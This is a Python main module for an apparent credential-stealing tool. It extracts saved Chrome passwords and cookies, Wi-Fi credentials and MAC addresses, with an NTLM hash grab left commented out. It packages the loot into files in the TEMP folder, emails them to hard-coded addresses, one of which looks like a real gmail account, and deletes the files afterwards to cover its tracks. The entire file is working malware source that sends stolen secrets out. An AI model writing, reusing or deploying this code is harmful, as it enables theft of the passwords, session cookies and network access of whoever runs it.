import os
import zipfile

from beautifier import Beautifier
from chromium import Chromium
from cookiesParser import CookiesParses
from mac import Mac
from ntlm import NTLM
from sendMail import SendMail
from wifi import WIFI


class Main:
    def __init__(self):
        self.source_mail = 'YOUR_EMAIL@gmail.com'
        self.source_pass = 'YOUR_PASSWORD'
        self.dest_mail = ['kovinevmv@gmail.com', 'YOUR_EMAIL@gmail.com', 'ANOTHER_EMAIL@gmail.com']

        self.files = ['pass.html', 'PC.html', 'cookies.zip', 'cookies.txt']

    def start(self):
        os.chdir(os.getenv("TEMP"))

        chrome = Chromium()
        passwords = chrome.get_passwords()
        Beautifier(self.files[0], passwords)

        cookies = chrome.get_cookies()
        CookiesParses(self.files[3], cookies)
        self.zip_file(self.files[3], self.files[2])

        m = Mac()
        macs = m.get_mac()

        w = WIFI()
        wifi = w.get_wifi()

        #n = NTLM()
        #ntlm = n.get_hash()

        wifi.update(macs)
        #wifi.update(ntlm)

        Beautifier(self.files[1], wifi)

        SendMail(self.source_mail,
                 self.source_pass,
                 self.dest_mail,
                 self.files[:-1])

        self.clean_collected_data()

    def clean_collected_data(self):
        for f in self.files:
            try:
                if os.path.exists(f):
                    os.remove(f)
            except:
                pass

    def zip_file(self, file_name, archive_name):
        zipf = zipfile.ZipFile(archive_name, 'w', zipfile.ZIP_DEFLATED)
        zipf.write(file_name)
        zipf.close()


if __name__ == '__main__':
    m = Main()
    m.start()
